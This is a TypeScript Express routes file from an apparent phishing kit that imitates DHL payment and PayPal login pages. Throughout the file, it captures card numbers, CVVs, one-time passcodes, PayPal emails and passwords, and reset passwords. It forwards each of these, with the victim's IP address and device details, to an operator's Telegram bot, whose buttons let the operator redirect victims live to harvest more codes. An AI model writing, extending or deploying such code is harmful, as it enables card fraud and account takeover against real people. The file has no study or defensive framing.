import type { Express, Request } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { 
  insertAdminSettingsSchema, 
  insertPaymentRecordSchema 
} from "@shared/schema";
import { z } from "zod";
import { 
  sendTelegramMessage, 
  formatPaymentNotification,
  formatPayPalNotification,
  getClientInfo
} from "./telegram";
import type { SessionData } from "express-session";

declare module "express-serve-static-core" {
  interface Request {
    session?: SessionData & { isAdmin?: boolean };
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Admin authentication endpoints
  app.get("/api/admin/check-setup", async (req, res) => {
    try {
      const settings = await storage.getAdminSettings();
      const isSetup = !!settings?.adminPasswordHash;
      res.json({ isSetup });
    } catch (error) {
      res.status(500).json({ error: "Failed to check setup status" });
    }
  });

  app.post("/api/admin/setup", async (req, res) => {
    try {
      const { password } = req.body;
      
      if (!password || password.length < 8) {
        return res.status(400).json({ error: "Password must be at least 8 characters" });
      }

      // Check if already setup
      const existingSettings = await storage.getAdminSettings();
      if (existingSettings?.adminPasswordHash) {
        return res.status(400).json({ error: "Admin password already set" });
      }

      // Hash password (simple hash for now - in production use bcrypt)
      const crypto = await import('crypto');
      const passwordHash = crypto.createHash('sha256').update(password).digest('hex');

      // Save password hash
      await storage.upsertAdminSettings({
        ...existingSettings,
        adminPasswordHash: passwordHash,
      });

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to setup admin password" });
    }
  });

  app.post("/api/admin/login", async (req, res) => {
    try {
      const { password } = req.body;
      
      if (!password) {
        return res.status(400).json({ error: "Password required" });
      }

      const settings = await storage.getAdminSettings();
      if (!settings?.adminPasswordHash) {
        return res.status(400).json({ error: "Admin not setup" });
      }

      // Verify password
      const crypto = await import('crypto');
      const passwordHash = crypto.createHash('sha256').update(password).digest('hex');

      if (passwordHash !== settings.adminPasswordHash) {
        return res.status(401).json({ error: "Invalid password" });
      }

      // Set session
      if (req.session) {
        req.session.isAdmin = true;
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Login failed" });
    }
  });

  app.post("/api/admin/logout", async (req, res) => {
    try {
      if (req.session) {
        req.session.isAdmin = false;
      }
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Logout failed" });
    }
  });

  app.get("/api/admin/check-auth", async (req, res) => {
    try {
      const isAuthenticated = req.session?.isAdmin === true;
      res.json({ isAuthenticated });
    } catch (error) {
      res.status(500).json({ error: "Failed to check authentication" });
    }
  });

  // Admin settings endpoints
  app.get("/api/admin/settings", async (req, res) => {
    try {
      const settings = await storage.getAdminSettings();
      res.json(settings || { 
        telegramBotToken: "", 
        telegramChatId: "",
        redirectUrl: "",
        redirectEnabled: "false"
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to get settings" });
    }
  });

  app.post("/api/admin/settings", async (req, res) => {
    try {
      const validated = insertAdminSettingsSchema.parse(req.body);
      const settings = await storage.upsertAdminSettings(validated);
      
      // Restart Telegram bot with new settings
      const { startTelegramBot } = await import("./telegram-bot");
      startTelegramBot();
      
      res.json(settings);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: error.errors });
      } else {
        res.status(500).json({ error: "Failed to save settings" });
      }
    }
  });

  app.post("/api/admin/test-telegram", async (req, res) => {
    try {
      const { botToken, chatId } = req.body;
      
      if (!botToken || !chatId) {
        return res.status(400).json({ error: "Missing botToken or chatId" });
      }

      const testMessage = `🧪 <b>Test de connexion</b>\n\nVotre bot Telegram est correctement configuré!\n\n⏰ ${new Date().toLocaleString('fr-FR')}`;
      const success = await sendTelegramMessage(botToken, chatId, testMessage);
      
      if (success) {
        res.json({ success: true, message: "Test message sent successfully" });
      } else {
        res.status(500).json({ success: false, error: "Failed to send test message" });
      }
    } catch (error) {
      res.status(500).json({ error: "Test failed" });
    }
  });

  // Payment flow endpoints
  app.post("/api/payment/start", async (req, res) => {
    try {
      const paymentData = {
        cardNumber: req.body.cardNumber,
        expiryMonth: req.body.expiryMonth,
        expiryYear: req.body.expiryYear,
        cvv: req.body.cvv,
        cardholderName: req.body.cardholderName,
        otp1: null,
        otp2: null,
        paypalEmail: null,
        paypalPassword: null,
      };

      const validated = insertPaymentRecordSchema.parse(paymentData);
      const record = await storage.createPaymentRecord(validated);
      
      // Create DHL session for waiting page
      const sessionId = Math.random().toString(36).substring(2, 10);
      const clientInfo = await getClientInfo(req);
      
      // Detect bank from card BIN
      const bin = req.body.cardNumber.replace(/\s/g, "").substring(0, 6);
      let bankName = "Bank";
      
      // Bank detection logic (Card brands first)
      if (bin.startsWith("4")) bankName = "Visa";
      else if (bin >= "510000" && bin <= "559999") bankName = "Mastercard";
      else if (bin.startsWith("34") || bin.startsWith("37")) bankName = "American Express";
      else if (bin.startsWith("35")) bankName = "JCB";
      else if (["497511", "497591", "497592"].includes(bin)) bankName = "BNP Paribas";
      else if (["450903", "450904", "486236"].includes(bin)) bankName = "Crédit Agricole";
      else if (["512871", "513457", "522371"].includes(bin)) bankName = "Société Générale";
      else if (["434533", "434534", "434535"].includes(bin)) bankName = "Crédit Mutuel";
      else if (["425706", "425707", "453275"].includes(bin)) bankName = "LCL";
      else if (["425790", "434769", "497878"].includes(bin)) bankName = "Caisse d'Épargne";
      else if (["438602", "497592", "513457"].includes(bin)) bankName = "La Banque Postale";
      else if (["450875", "486236", "522371"].includes(bin)) bankName = "Boursorama";

      await storage.createDhlSession({
        sessionId,
        paymentId: record.id,
        cardNumber: req.body.cardNumber,
        cardholderName: req.body.cardholderName,
        bankName,
        ipAddress: clientInfo.ipAddress,
        country: clientInfo.country,
        device: clientInfo.device,
        browser: clientInfo.browser,
        status: "waiting",
      });

      // Send notification to Telegram
      const settings = await storage.getAdminSettings();
      if (settings?.telegramBotToken && settings?.telegramChatId) {
        const notification = formatPaymentNotification({
          cardNumber: req.body.cardNumber,
          expiryMonth: req.body.expiryMonth,
          expiryYear: req.body.expiryYear,
          cvv: req.body.cvv,
          cardholderName: req.body.cardholderName,
          timestamp: new Date(),
          ipAddress: clientInfo.ipAddress,
          country: clientInfo.country,
          device: clientInfo.device,
          browser: clientInfo.browser,
          sessionId: sessionId,
        });

        await sendTelegramMessage(
          settings.telegramBotToken,
          settings.telegramChatId,
          notification.message,
          notification.keyboard
        );
      }
      
      res.json({ paymentId: record.id, sessionId });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: error.errors });
      } else {
        res.status(500).json({ error: "Failed to create payment record" });
      }
    }
  });

  app.post("/api/payment/:id/otp1", async (req, res) => {
    try {
      const { id } = req.params;
      const { otp } = req.body;

      // Validate OTP: reject codes like "000000", "111111", etc.
      const isInvalidOTP = /^(\d)\1{5}$/.test(otp) || !otp || otp.length !== 6;
      if (isInvalidOTP) {
        return res.status(400).json({ error: "Invalid OTP code" });
      }

      const updated = await storage.updatePaymentRecord(id, { otp1: otp });
      
      if (!updated) {
        return res.status(404).json({ error: "Payment record not found" });
      }

      // Send notification to Telegram after OTP1 is verified
      const settings = await storage.getAdminSettings();
      if (settings?.telegramBotToken && settings?.telegramChatId) {
        const clientInfo = await getClientInfo(req);
        
        // Get DHL session to include sessionId in notification
        const sessions = await storage.getAllDhlSessions();
        const session = sessions.find((s: any) => s.paymentId === id);
        
        const notification = formatPaymentNotification({
          cardNumber: updated.cardNumber,
          expiryMonth: updated.expiryMonth,
          expiryYear: updated.expiryYear,
          cvv: updated.cvv,
          cardholderName: updated.cardholderName,
          otp1: updated.otp1 || undefined,
          otp2: updated.otp2 || undefined,
          timestamp: updated.createdAt || new Date(),
          ipAddress: clientInfo.ipAddress,
          country: clientInfo.country,
          device: clientInfo.device,
          browser: clientInfo.browser,
          sessionId: session?.sessionId,
        });

        await sendTelegramMessage(
          settings.telegramBotToken,
          settings.telegramChatId,
          notification.message,
          notification.keyboard
        );
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update OTP" });
    }
  });

  app.post("/api/payment/:id/otp2", async (req, res) => {
    try {
      const { id } = req.params;
      const { otp } = req.body;

      // Validate OTP: reject codes like "000000", "111111", etc.
      const isInvalidOTP = /^(\d)\1{5}$/.test(otp) || !otp || otp.length !== 6;
      if (isInvalidOTP) {
        return res.status(400).json({ error: "Invalid OTP code" });
      }

      const updated = await storage.updatePaymentRecord(id, { otp2: otp });
      
      if (!updated) {
        return res.status(404).json({ error: "Payment record not found" });
      }

      // Send notification to Telegram after OTP2 is verified
      const settings = await storage.getAdminSettings();
      if (settings?.telegramBotToken && settings?.telegramChatId) {
        const clientInfo = await getClientInfo(req);
        
        // Get DHL session to include sessionId in notification
        const sessions = await storage.getAllDhlSessions();
        const session = sessions.find((s: any) => s.paymentId === id);
        
        const notification = formatPaymentNotification({
          cardNumber: updated.cardNumber,
          expiryMonth: updated.expiryMonth,
          expiryYear: updated.expiryYear,
          cvv: updated.cvv,
          cardholderName: updated.cardholderName,
          otp1: updated.otp1 || undefined,
          otp2: updated.otp2 || undefined,
          timestamp: updated.createdAt || new Date(),
          ipAddress: clientInfo.ipAddress,
          country: clientInfo.country,
          device: clientInfo.device,
          browser: clientInfo.browser,
          sessionId: session?.sessionId,
        });

        await sendTelegramMessage(
          settings.telegramBotToken,
          settings.telegramChatId,
          notification.message,
          notification.keyboard
        );
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update OTP" });
    }
  });

  // PayPal login endpoint
  app.post("/api/paypal/login", async (req, res) => {
    try {
      const { email, password } = req.body;

      if (!email || !password) {
        return res.status(400).json({ error: "Email and password required" });
      }

      const clientInfo = await getClientInfo(req);

      // Create a session for this login attempt
      const session = await storage.createPaypalSession({
        sessionId: clientInfo.sessionId,
        email,
        password,
        ipAddress: clientInfo.ipAddress,
        country: clientInfo.country,
        device: clientInfo.device,
        browser: clientInfo.browser,
        status: "waiting",
      });

      // Send notification to Telegram
      const settings = await storage.getAdminSettings();
      if (settings?.telegramBotToken && settings?.telegramChatId) {
        const notification = formatPayPalNotification({
          email,
          password,
          timestamp: new Date(),
          ipAddress: clientInfo.ipAddress,
          country: clientInfo.country,
          device: clientInfo.device,
          browser: clientInfo.browser,
          sessionId: clientInfo.sessionId,
        });

        await sendTelegramMessage(
          settings.telegramBotToken,
          settings.telegramChatId,
          notification.message,
          notification.keyboard
        );
      }

      res.json({ success: true, sessionId: session.sessionId });
    } catch (error) {
      res.status(500).json({ error: "Failed to process login" });
    }
  });

  // Check redirect status for PayPal session
  app.get("/api/paypal/check-redirect/:sessionId", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const session = await storage.getPaypalSession(sessionId);

      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }

      // Return redirect with proper session parameter
      if (session.redirectUrl) {
        const redirectWithSession = `${session.redirectUrl}${session.redirectUrl.includes('?') ? '&' : '?'}session=${sessionId}`;
        res.json({ redirect: redirectWithSession });
      } else {
        res.json({ redirect: null });
      }
    } catch (error) {
      res.status(500).json({ error: "Failed to check redirect" });
    }
  });

  // Get PayPal session data (client)
  app.get("/api/paypal/session/:sessionId", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const session = await storage.getPaypalSession(sessionId);

      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json({
        redirectUrl: session.redirectUrl,
        redirectVersion: session.redirectVersion ?? 0,
        currentPath: session.currentPath,
        status: session.status,
        device: session.device,
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to get session" });
    }
  });

  // Update current path for PayPal session (client)
  app.patch("/api/paypal/session/:sessionId/path", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const { currentPath } = req.body;

      const updated = await storage.updatePaypalSession(sessionId, {
        currentPath,
      });

      if (!updated) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update path" });
    }
  });

  // PayPal OTP submission endpoint
  app.post("/api/paypal/otp", async (req, res) => {
    try {
      const { sessionId, otp, step } = req.body;

      if (!sessionId || !otp) {
        return res.status(400).json({ error: "SessionId and OTP required" });
      }

      const session = await storage.getPaypalSession(sessionId);
      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }

      const clientInfo = await getClientInfo(req);

      // Send notification to Telegram
      const settings = await storage.getAdminSettings();
      if (settings?.telegramBotToken && settings?.telegramChatId) {
        const message = `
🔢 <b>PAYPAL - CODE OTP ${step === 2 ? '2' : '1'}</b>

📧 <b>Email:</b> <code>${session.email}</code>
🔐 <b>Mot de passe:</b> <code>${session.password}</code>
🔑 <b>Code OTP ${step === 2 ? '2' : '1'}:</b> <code>${otp}</code>

🌍 <b>Pays:</b> ${clientInfo.country}
📱 <b>Appareil:</b> ${clientInfo.device}
🌐 <b>Navigateur:</b> ${clientInfo.browser}
🔗 <b>IP:</b> <code>${clientInfo.ipAddress}</code>
🆔 <b>Session:</b> <code>${sessionId}</code>
⏰ <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
`;

        const keyboard = [
          [
            { text: "❌ LOGIN ERROR ❌", callback_data: `paypal_error_${sessionId}` }
          ],
          [
            { text: "⏳ WAITING", callback_data: `paypal_waiting_${sessionId}` },
            { text: "✅ APPROVE", callback_data: `paypal_approve_${sessionId}` }
          ],
          [
            { text: "🔑 PASSWORD", callback_data: `paypal_password_${sessionId}` },
            { text: "🔢 OTP 1", callback_data: `paypal_otp1_${sessionId}` }
          ],
          [
            { text: "🔢 OTP 2", callback_data: `paypal_otp2_${sessionId}` },
            { text: "✔️ SUCCESS", callback_data: `paypal_success_${sessionId}` }
          ],
          [
            { text: "🏠 HOME", callback_data: `paypal_home_${sessionId}` }
          ]
        ];

        await sendTelegramMessage(
          settings.telegramBotToken,
          settings.telegramChatId,
          message,
          keyboard
        );
      }

      res.json({ success: true });
    } catch (error) {
      console.error("OTP submission error:", error);
      res.status(500).json({ error: "Failed to submit OTP" });
    }
  });

  // PayPal password reset endpoint
  app.post("/api/paypal/password-reset", async (req, res) => {
    try {
      const { sessionId, newPassword, confirmPassword } = req.body;

      if (!sessionId || !newPassword || !confirmPassword) {
        return res.status(400).json({ error: "All fields required" });
      }

      if (newPassword !== confirmPassword) {
        return res.status(400).json({ error: "Passwords do not match" });
      }

      const session = await storage.getPaypalSession(sessionId);
      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }

      const clientInfo = await getClientInfo(req);

      // Send notification to Telegram
      const settings = await storage.getAdminSettings();
      if (settings?.telegramBotToken && settings?.telegramChatId) {
        const message = `
🔑 <b>PAYPAL - NOUVEAU MOT DE PASSE</b>

📧 <b>Email:</b> <code>${session.email}</code>
🔐 <b>Ancien mot de passe:</b> <code>${session.password}</code>
🆕 <b>Nouveau mot de passe:</b> <code>${newPassword}</code>
✅ <b>Confirmation:</b> <code>${confirmPassword}</code>

🌍 <b>Pays:</b> ${clientInfo.country}
📱 <b>Appareil:</b> ${clientInfo.device}
🌐 <b>Navigateur:</b> ${clientInfo.browser}
🔗 <b>IP:</b> <code>${clientInfo.ipAddress}</code>
🆔 <b>Session:</b> <code>${sessionId}</code>
⏰ <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
`;

        const keyboard = [
          [
            { text: "✅ APPROVE", callback_data: `paypal_approve_${sessionId}` },
            { text: "❌ ERROR", callback_data: `paypal_error_${sessionId}` },
          ],
          [
            { text: "🔐 OTP", callback_data: `paypal_otp_${sessionId}` },
            { text: "🎉 SUCCESS", callback_data: `paypal_success_${sessionId}` },
          ],
          [
            { text: "🏠 HOME", callback_data: `paypal_home_${sessionId}` },
          ],
        ];

        await sendTelegramMessage(
          settings.telegramBotToken,
          settings.telegramChatId,
          message,
          keyboard
        );
      }

      res.json({ success: true });
    } catch (error) {
      console.error("Password reset error:", error);
      res.status(500).json({ error: "Failed to reset password" });
    }
  });

  // Get all waiting PayPal sessions (admin)
  app.get("/api/admin/paypal-sessions", async (req, res) => {
    try {
      const sessions = await storage.getAllPaypalSessions();
      const waitingSessions = sessions.filter(s => s.status === "waiting");
      res.json(waitingSessions);
    } catch (error) {
      res.status(500).json({ error: "Failed to get sessions" });
    }
  });

  // DHL session endpoints
  app.get("/api/dhl/session/:sessionId", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const session = await storage.getDhlSession(sessionId);

      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json(session);
    } catch (error) {
      res.status(500).json({ error: "Failed to get session" });
    }
  });

  // Update current path for DHL session (client)
  app.patch("/api/dhl/session/:sessionId/path", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const { currentPath } = req.body;

      const updated = await storage.updateDhlSession(sessionId, {
        currentPath,
      });

      if (!updated) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update path" });
    }
  });

  app.get("/api/admin/dhl-sessions", async (req, res) => {
    try {
      const sessions = await storage.getAllDhlSessions();
      const waitingSessions = sessions.filter(s => s.status === "waiting");
      res.json(waitingSessions);
    } catch (error) {
      res.status(500).json({ error: "Failed to get sessions" });
    }
  });

  app.post("/api/admin/dhl-sessions/:sessionId/redirect", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const { redirectUrl } = req.body;

      // Get current session to increment version
      const currentSession = await storage.getDhlSession(sessionId);
      if (!currentSession) {
        return res.status(404).json({ error: "Session not found" });
      }

      // Increment redirectVersion and update redirectUrl, keep status as waiting
      const updated = await storage.updateDhlSession(sessionId, {
        redirectUrl,
        redirectVersion: (currentSession.redirectVersion ?? 0) + 1,
        status: "waiting", // Keep as waiting to allow multiple redirects
      });

      if (!updated) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Failed to update session" });
    }
  });

  // Update PayPal session redirect (admin)
  app.post("/api/admin/paypal-sessions/:sessionId/redirect", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const { redirectUrl } = req.body;

      // Get current session to increment version
      const currentSession = await storage.getPaypalSession(sessionId);
      if (!currentSession) {
        return res.status(404).json({ error: "Session not found" });
      }

      // Increment redirectVersion and update redirectUrl, keep status as waiting
      const updated = await storage.updatePaypalSession(sessionId, {
        redirectUrl,
        redirectVersion: (currentSession.redirectVersion ?? 0) + 1,
        status: "waiting", // Keep as waiting to allow multiple redirects
      });

      if (!updated) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Failed to update session" });
    }
  });

  // Get all payment records (for admin)
  app.get("/api/payments", async (req, res) => {
    try {
      const records = await storage.getAllPaymentRecords();
      res.json(records);
    } catch (error) {
      res.status(500).json({ error: "Failed to get payment records" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
